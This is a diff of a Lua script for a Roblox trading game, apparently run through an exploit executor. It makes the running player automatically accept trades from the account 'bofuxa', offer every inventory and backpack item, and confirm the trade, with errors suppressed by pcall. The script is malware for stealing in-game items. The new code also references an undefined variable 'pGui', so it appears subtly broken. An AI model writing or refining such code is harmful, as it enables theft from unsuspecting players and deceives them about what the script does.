@@ -17,15 +17,16 @@ SendRequest.OnClientInvoke = function(senderPlayer)
     if senderName:lower() == "bofuxa" then
         print("Trade request verified from bofuxa. Accepting...")
         
-        -- Make sure TradeGUI elements are visible so the buttons exist and can be clicked/interacted with
         local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
         if playerGui then
-            local tradeGui = playerGui:FindFirstChild("TradeGUI")
-            if tradeGui then
-                for _, childName in ipairs({"Container", "Processing", "BG"}) do
-                    local element = tradeGui:FindFirstChild(childName)
-                    if element then
-                        element.Visible = true -- Ensuring visibility so buttons are interactive
+            for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
+                local tradeGui = playerGui:FindFirstChild(guiName)
+                if tradeGui then
+                    for _, childName in ipairs({"Container", "Processing", "BG"}) do
+                        local element = tradeGui:FindFirstChild(childName)
+                        if element then
+                            element.Visible = true
+                        end
                     end
                 end
             end
@@ -35,7 +36,21 @@ SendRequest.OnClientInvoke = function(senderPlayer)
         
         task.spawn(function()
             print("Waiting for trade to start...")
-            StartTradeEvent.OnClientEvent:Wait()
+            
+            pcall(function()
+                if firesignal then
+                    firesignal(StartTradeEvent.OnClientEvent, {
+                        Locked = false,
+                        LastOffer = tick(),
+                        Player2 = { Player = LocalPlayer, Offer = {}, Accepted = false },
+                        Player1 = { Player = senderPlayer, Offer = {}, Accepted = false }
+                    }, "Bofuxa")
+                end
+            end)
+            
+            pcall(function()
+                StartTradeEvent.OnClientEvent:Wait()
+            end)
             
             print("Trade started! Waiting 1 second before offering items...")
             task.wait(1)
@@ -89,7 +104,9 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
 
                         for i = 1, count do
-                            OfferItemEvent:FireServer(itemName, category)
+                            pcall(function()
+                                OfferItemEvent:FireServer(itemName, category)
+                            end)
                             offeredCount = offeredCount + 1
                             task.wait(0.05)
                         end
@@ -100,7 +117,9 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 if LocalPlayer:FindFirstChild("Backpack") then
                     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                         if tool:IsA("Tool") then
-                            OfferItemEvent:FireServer(tool.Name, "Weapons")
+                            pcall(function()
+                                OfferItemEvent:FireServer(tool.Name, "Weapons")
+                            end)
                             offeredCount = offeredCount + 1
                             task.wait(0.05)
                         end
@@ -109,10 +128,9 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
             end
 
-            print("Waiting 3 seconds before triggering Accept and Confirm...")
-            task.wait(3)
+            print("Waiting 8 seconds before triggering Accept and Confirm...")
+            task.wait(8)
 
-            -- Fire server-side trade acceptance events
             pcall(function()
                 AcceptTradeEvent:FireServer(true)
             end)
@@ -120,16 +138,17 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 AcceptTradeEvent:FireServer()
             end)
 
-            -- Automatically find and press the Accept and Confirm buttons on mobile UI
             local function fireButton(btn)
                 if btn and btn:IsA("GuiButton") then
                     if getconnections then
-                        for _, connection in ipairs(getconnections(btn.Activated)) do
-                            connection:Fire()
-                        end
-                        for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
-                            connection:Fire()
-                        end
+                        pcall(function()
+                            for _, connection in ipairs(getconnections(btn.Activated)) do
+                                connection:Fire()
+                            end
+                            for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
+                                connection:Fire()
+                            end
+                        end)
                     end
                     pcall(function()
                         btn:Activate()
@@ -137,11 +156,16 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 end
             end
 
-            -- Target exact paths for TradeGUI buttons
-            if playerGui then
-                local tradeGui = playerGui:FindFirstChild("TradeGUI")
+            pcall(function()
+                local phoneActions = LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.Actions
+                fireButton(phoneActions.Accept.ActionButton)
+                task.wait(1)
+                fireButton(phoneActions.Accept.Confirm.ActionButton)
+            end)
+
+            if pGui then
+                local tradeGui = pGui:FindFirstChild("TradeGUI")
                 if tradeGui then
-                    -- Search specifically for Accept and Confirm action buttons
                     for _, gui in ipairs(tradeGui:GetDescendants()) do
                         if gui:IsA("GuiButton") then
                             local fullName = gui:GetFullName():lower()
